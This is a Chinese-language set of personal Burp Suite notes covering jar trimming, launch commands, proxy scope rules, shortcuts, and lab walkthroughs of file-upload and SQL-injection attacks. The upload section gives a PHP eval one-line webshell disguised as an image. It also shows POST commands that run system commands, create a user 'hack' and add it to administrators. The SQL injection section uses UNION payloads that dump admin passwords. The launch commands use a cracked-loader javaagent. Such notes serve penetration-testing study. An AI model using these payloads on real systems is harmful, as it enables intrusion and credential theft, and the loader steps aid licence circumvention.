## 精简

https://www.52pojie.cn/forum.php?mod=viewthread&tid=1687434

```ps1
zip -q -d burpsuite_pro_v2022.9.jar chromium-macosarm64-105.0.5195.102.zip
zip -q -d burpsuite_pro_v2022.9.jar chromium-macosx64-105.0.5195.102.zip
zip -q -d burpsuite_pro_v2022.9.jar chromium-linux64-105.0.5195.102.zip

7z d -r burpsuite_pro_v2021.6.2.jar chromium-linux*
7z d -r burpsuite_pro_v2021.6.2.jar chromium-macos*

(Get-ChildItem burp*.jar)[0].Name | %{7z d -r $_ chromium-linux* chromium-macos*}
```

## 条件竞争

ver: 2023.10.3.2

在 Repeater 中比如创建 20 请求加到同一个 Group,

点击 Send 边的箭头 -> Send group by parallel (last-byte sync)

## 配置

**中文**

- User Option - Display - Http Message Display, 使用宋体
- Character Sets: UTF8

**启动命令**

```sh
# 普通启动
javaw -jar burploader.jar
# 跳过loader
javaw -noverify -javaagent:burploader.jar -jar burpsuite_pro_v2021.6.2.jar
# 禁止缩放 防止光标错位
javaw -noverify -Dsun.java2d.uiScale=1 -javaagent:burploader.jar -jar burpsuite_pro_v2021.6.2.jar

# 安装插件
java -jar <path-to-burp.jar> --install-plugin <path-to-plugin.jar>
```

**工具**

- Battering ram .用户名和密码是用同样的,进行爆破

### 配置 proxy history

- Target - Scope - √ Use Advanced scope control
- Target - Scope - Include in scope - Add - any
- Target - Scope - Exclude from scope - Add Any:`(.*.baidu.com|.*.google.com|www.google-\.*|cdn\.jsdelivr\.net|a\.vdo\.ai|dida365\.com|mmstat\.com|csdn\.net|zhihu\.com|googleapis\.com|youtube\.com|github\.com)`
- 2.Proxy - Option - Miscellaneous - Don't send items to Proxy history or live tasks, if out of scope
- 2.1Proxy - Option - Intetcept Client - Requests - Add: And, Domain name, `(.*.baidu.com|.*.google.com|www.google-\.*|cdn\.jsdelivr\.net|a\.vdo\.ai|dida365\.com|mmstat\.com|csdn\.net|zhihu\.com|googleapis\.com|youtube\.com)`
- 2.1Proxy - Option - Intetcept Server Response - Add: And, Domain name, `(.*.baidu.com|.*.google.com)`

### 配置 Upstream proxy

```
Destination host:  *
别的正常填上级代理
```

## Reading

https://t0data.gitbooks.io/burpsuite/content/chapter3.html

Intuder 注意, payloads 最下面转义(url encode)有时候需要关掉

排除地址, 拦截的时候 Proxy - Intercept - Action - Don't intercept request =>

    Target选项卡-scope include .* .* .*
    Target选项卡-scope exclude .*firefox.*

Proxy-Option-Intercept Client Requests, 添加 does not match [url]

    ^.*(bdstatic|baidu|g-fox|firefox|mozilla|google|alicdn).*$
    可能Scope中使用advanced scope也要排除

exclude url from histroy

    1. Proxy - Options - Miscellaneous - Don't send items to Proxy history or live tasks, if out of scope
    2. Project Options选项卡 - Out of Scope requests -  Drop all , 开启后其他地址返回404

拦截指定网址

    方法1 “Proxy”选项卡--选择“Options”菜单--往下看到“Intercept Client Requests”节区
    方法2 你可以使用“include in-scope items only(仅仅包括在范围内的项目)”以减少数据必须保存量。

[Intuder](https://blog.51cto.com/laoyinga/2151018)

    几种模式对应不同的payload数量

    结果过滤
        flag\{.*\}
        ctfhub\{.*\}

添加自定义 header

Proxy - Options - Match and Replace
match 为空就是添加
添加到 response header, match 空
replace: Content-type:text/html;charset=utf-8

## 快捷键

```
Ctrl T, Toggle Intercept
Ctrl Shift P, Switch to Proxy
Ctrl Shift I, Switch to Intruder
Ctrl Shift R, Switch to Repeater
Ctrl +/-, 切换标签
```

## Burp Suite 常见问题

GET 改 POST 请求

    自动修改： 推荐---, 右击 Change request method
    手动修改： 添加  `Content-Type: application/x-www-form-urlencoded`

refresh 自动刷新的变量字段。
Options - Grep Match 常用，密码错误的时候，可以添加一个匹配关键字。开始攻击后会多一个字段。[^1]

      结果中也可以过滤(在标签Result下面)，
      grep - match 添加过滤字段 login_error,比返回长度效果更好。
      runtime file 每行作为一个
      custom iterator , 可以生成像 username@@password  ，选posisiton 2 @@, position3 password,
      copy other payload , 两次payload值要一样时使用。

wordpress , ?author=1 可以知道 id=1 的用户

## Burp Suite 破解文件上传

普通难度：

    抓包, 1. 改 content-type即可。 image/png
    抓包, 2. 改 file-name 即可。 image/png

High 级别---系统认可图片

    copy test.png/b+test.html/a a.png
    test.html:  `<script>alert(1)</script>`

用来上传 php, 比如 `copy test.png/b+hack.php/a caidao.png`

hack.php 里写一句话木马 :<?php @eval(_POST['1']);?>

查看有没效果

http://192.168.1.107/dwva/vulnerabilities/fi/?page=/hackable/uploafs/caidao.png

hackbar

URI： http://192.168.1.107/dwva/vulnerabilities/fi/?page=C:\www\DWVA\hackable/uploads/hack.png

    POST:1=echo '<pre>';system('ipconfig')
    POST:1=echo '<pre>';system('net user hack 123456/add');
    POST:1=echo '<pre>';system('net localgroup administrators hack /add'):

## Burp Suite 配合 SQLmap 实现被动式注入发现

    User Option - Misc - Logging, √Proxy Request ,选择一个文件位置保存。
    打开文件搜索请求，确定请求存在。
    sqlmap.py -r 文件目录
    sqlmap.py -r C:\log\1.txt --batch
    找到并查看 outout文件。在txt中找到注入链接, 比如，测试
    sqlmap.py -u "http://192.168.1.102/inject.php?id=2" --dbs

## Burp Suite 数据获取测试

用 BP 抓个包 比如 http://192.168.1.102/inject.php?id=1

`在1后面加a 1$a$ a设置成字段。`

Payloads- Payloads Options , Load , 找 FuzzLists 目录下的 sqli-union-select

用 Intruder 开始攻击, 查看结果-Response

查看结果后 确定为 3 个字段，在结果里右击查询 3 字段的发送到 repeater, Go 一下。

     在params里 select%201,2,3 from a   测试a表是否存在。显示 doesn't exist, 将它 设置成Grep Match 字段进行过滤。
     payloads load,  common-tables进行start attack。

查看结果， 确定 admin 为表名。继续修改 params 猜列名

        select%201,a,3%20from%20admin 显示 unkonwn column ，将请求必到Intruder,
          将 a 设置成变量， unkonwn column为过滤字段。
          payload - load, comman - column
          start attack,查看结果。
          确定了id , password, 列。
        -1 union all select%201,password,3%20from%20admin
        -1 union all select%201,password,3%20from%20admin limit 0, 1

发到 Intruder

    id=1 union all select 1,2,3 from admin#
    id=1 union all select 1,password,3 from admin#
    id=1 union all select 1,concat(id, username, password),3 from admin#
    id=1 union all select 1,concat(id,0x7c, username,0x7c, password),3 from admin#
     0x7c是管理符 |

发到 intruder,

      limit%20$0$,1 这里将0改为字段了。limit参数为：偏移量，最大数目

      payload type: numbers,
        from 0, to 3, step 1,
      start attack

Grep Extract, add 选中后会自动正则。 清除多余的过滤。b

菜单栏 save - result table, 只留一个正则。保存

## Burp Suite 目录与文件扫描测试

1.抓包 history 中， 发到 Intruder

2.Positions

```
payload 加载  php去重复.txt 字典
payload 选项卡 中有 Payload Encoding √要去掉 （否则会编码/符号）
start attack
在结果列表， Filter 只勾2xx
```

## 联动 xray

```bash
./xray_windows_amd64.exe webscan --listen 127.0.0.1:8888 --html-output proxy.html
# Settings - Network - Connections 设置 Upstream proxy servers, Destination Host: *
```

# Article

[实现 BurpSuite 多级代理的两种常用方法](https://mp.weixin.qq.com/s/x4_ZlE8H01ULjXrknIpKxg)
[Burpsuite 双层代理的抓包小技巧](https://mp.weixin.qq.com/s/udmke_48dgg82awRnMNIXg)
[插件 | BurpSuite 插件 -- LoggerPlusPlus](https://mp.weixin.qq.com/s/_wI0V3s9sURytjgO8Aldbw)
[插件 | 高度自定义 Burp 插件 log4j2burpscanner](https://mp.weixin.qq.com/s/DPRwo3n_4qRCGLA6Wdqx_g)
[插件 | sqlmap4burp++]()
[插件 | Doraemon exp 模板](https://mp.weixin.qq.com/s/4K6IaPCjWNSQ27sPV0GaEA)
[插件 | 武装你的 BurpSuite(一)](https://mp.weixin.qq.com/s/Pl3HDMV_EhDlvY8lyzk02g)
[插件 | 武装你的 BurpSuite（二）](https://mp.weixin.qq.com/s/pNMJhiCDbo_kLsNYGJnNmA)
[插件 |【Python+Java】Burpsuite 插件开发](https://mp.weixin.qq.com/s/xEKSXm2-fCHhyvZxrQUQvQ)
[插件 | xp_CAPTCHA 4.2 - Burp 验证码识别插件](https://mp.weixin.qq.com/s/nCcZ8gNutfPNz7X0lsxsdQ)
[插件 | 武装你的 Burpsuite](https://mp.weixin.qq.com/s/ulIp4w1dQv7y6yC4ZHlP8g)
[插件 | 一个集成的 BurpSuite 漏洞探测插件](https://mp.weixin.qq.com/s/H0uRQ45NI0SQtT8mRckU_g)
[插件 | App 渗透：BurpSuite 插件-Brida(0.6) 2023 新版使用教程 2](https://www.bilibili.com/video/BV16N411i7A2/)

## Tips

[干货 | Burpsuite 的使用 tips 总结](https://mp.weixin.qq.com/s/4XkYFCr2L-yJNLDBUYoIqA)
[Burpsuite+Proxifier 抓取 exe 数据包](https://mp.weixin.qq.com/s/tt2IrE6627QfQ44N_mGpcw)

## 靶场系列

[梨子带你刷 burpsuite 靶场系列之客户端漏洞篇 - WebSocket 专题](https://www.anquanke.com/post/id/246092)
[梨子带你刷 burpsuite 靶场系列之客户端漏洞篇 - 基于 DOM 的漏洞专题](https://www.anquanke.com/post/id/246090)
[梨子带你刷 burpsuite 靶场系列之客户端漏洞篇 - 点击劫持专题](https://www.anquanke.com/post/id/246062)
[梨子带你刷 burpsuite 靶场系列之客户端漏洞篇 - 跨域资源共享(CORS)专题](https://www.anquanke.com/post/id/246029)
[梨子带你刷 burpsuite 靶场系列之客户端漏洞篇 - 跨站脚本(XSS)专题](https://www.anquanke.com/post/id/245953)
[梨子带你刷 burpsuite 靶场系列之客户端漏洞篇 - 跨站请求伪造(CSRF)专题](https://www.anquanke.com/post/id/246005)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - OS 命令注入专题](https://www.anquanke.com/post/id/245535)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - Sql 注入专题](https://www.anquanke.com/post/id/245532)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - XML 外部实体注入(XXE)专题](https://www.anquanke.com/post/id/245540)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - 信息泄漏专题](https://www.anquanke.com/post/id/245537)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - 商业逻辑漏洞专题](https://www.anquanke.com/post/id/245536)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - 服务端请求伪造(SSRF)专题](https://www.anquanke.com/post/id/245539)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - 目录穿越专题](https://www.anquanke.com/post/id/245534)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - 访问控制漏洞与越权专题](https://www.anquanke.com/post/id/245538)
[梨子带你刷 burpsuite 靶场系列之服务器端漏洞篇 - 身份验证专题](https://www.anquanke.com/post/id/245533)
[梨子带你刷 burpsuite 靶场系列之高级漏洞篇 - HTTP Host 头攻击专题](https://www.anquanke.com/post/id/246515)
[梨子带你刷 burpsuite 靶场系列之高级漏洞篇 - HTTP 请求走私专题](https://www.anquanke.com/post/id/246516)
[梨子带你刷 burpsuite 靶场系列之高级漏洞篇 - OAuth2.0 认证漏洞专题](https://www.anquanke.com/post/id/246658)
[梨子带你刷 burpsuite 靶场系列之高级漏洞篇 - Web 缓存投毒专题](https://www.anquanke.com/post/id/246452)
[梨子带你刷 burpsuite 靶场系列之高级漏洞篇 - 不安全的反序列化专题](https://www.anquanke.com/post/id/246276)
[梨子带你刷 burpsuite 靶场系列之高级漏洞篇 - 服务器端模板注入(SSTI)专题](https://www.anquanke.com/post/id/246293)
[【安全练兵场】| BurpSuite 靶场系列之命令注入（5 个实验）](https://mp.weixin.qq.com/s/SRlQ6MdtUey8gr4PQA_IVQ)
[使用插件加密处理密码](https://mp.weixin.qq.com/s/72S-mYCHEnQZBPEIcKME3Q)
[服务器端漏洞篇之身份验证专题](https://mp.weixin.qq.com/s/xto4_GFykjYC1it0bgQNJQ)
[Burpsuite 指纹特征绕过](https://mp.weixin.qq.com/s/GVVZYKQsuWXqRap9zGfFDA)
[九维团队-绿队（改进）| APP 安全-Frida 联动 BurpSuite 实现自动加解密](https://mp.weixin.qq.com/s/jdeEmwz8fsySUkszFbZwpA)
[2023 一整年 BurpSuite 都更新了什么?](https://mp.weixin.qq.com/s/-YI6Y8rMMBLXr1sBqOas5A)

## plugins

[干货|burpsuite 插件整理](https://mp.weixin.qq.com/s/nj0AKKqUmOtAdWIoIqHmkg)
[burp 结合 mitmproxy 实战解决网站请求加解密](https://www.bilibili.com/video/BV17u4y1Y7eg/)
[ autoDecoder | 自动解密请求 | 逆向解密--“神器”插件推荐](https://mp.weixin.qq.com/s/DrjyJRp81U5uH0sY7g9aZA)
